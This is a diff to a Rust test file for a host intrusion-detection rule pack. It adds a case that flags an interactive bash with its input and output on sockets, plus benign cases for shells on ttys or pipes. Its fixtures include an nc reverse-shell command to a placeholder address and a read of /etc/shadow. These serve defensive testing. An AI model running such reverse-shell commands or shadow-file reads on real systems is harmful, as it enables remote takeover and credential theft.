@@ -50,6 +50,14 @@ fn every_pack_rule_loads_and_the_obvious_cases_fire() {
         (
             ev(
                 "proc_exec",
+                "/bin/bash",
+                json!({"exe": "/bin/bash", "argv": ["bash", "-i"], "stdio": ["socket", "socket", "socket"]}),
+            ),
+            "witness.exec.shell-on-socket",
+        ),
+        (
+            ev(
+                "proc_exec",
                 "/bin/nc",
                 json!({"exe": "/usr/bin/nc", "argv": ["nc", "-e", "/bin/sh", "1.2.3.4", "9"]}),
             ),
@@ -177,6 +185,23 @@ fn ordinary_activity_is_quiet() {
             "file_open_read",
             "/usr/sbin/sshd",
             json!({"path": "/etc/shadow"}),
+        ),
+        // A shell on a tty or pipes, or a non-shell on a socket (an ordinary network service),
+        // is normal.
+        ev(
+            "proc_exec",
+            "/bin/bash",
+            json!({"exe": "/bin/bash", "argv": ["bash"], "stdio": ["tty", "tty", "tty"]}),
+        ),
+        ev(
+            "proc_exec",
+            "/bin/sh",
+            json!({"exe": "/bin/sh", "argv": ["sh", "-c", "x"], "stdio": ["pipe", "pipe", "pipe"]}),
+        ),
+        ev(
+            "proc_exec",
+            "/usr/sbin/sshd",
+            json!({"exe": "/usr/sbin/sshd", "argv": ["sshd"], "stdio": ["socket", "socket", "socket"]}),
         ),
         // `sg` is newgrp, which reads shadow for group passwords (seen on Ubuntu 22.04).
         ev(
